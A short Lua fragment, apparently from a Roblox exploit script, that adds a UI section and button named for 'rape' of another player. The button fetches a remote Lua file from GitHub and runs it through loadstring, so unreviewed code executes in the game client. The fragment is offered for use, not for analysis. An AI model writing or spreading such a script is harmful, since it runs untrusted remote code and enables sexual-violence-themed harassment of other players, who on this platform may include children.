...
local SectionRape = Main:NewSection("RAPE SCRIPT")
SectionRape:NewButton("Rape Dat Boi", ".", function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MontyEAG/scripts/main/rapa.lua'),true))()
end)
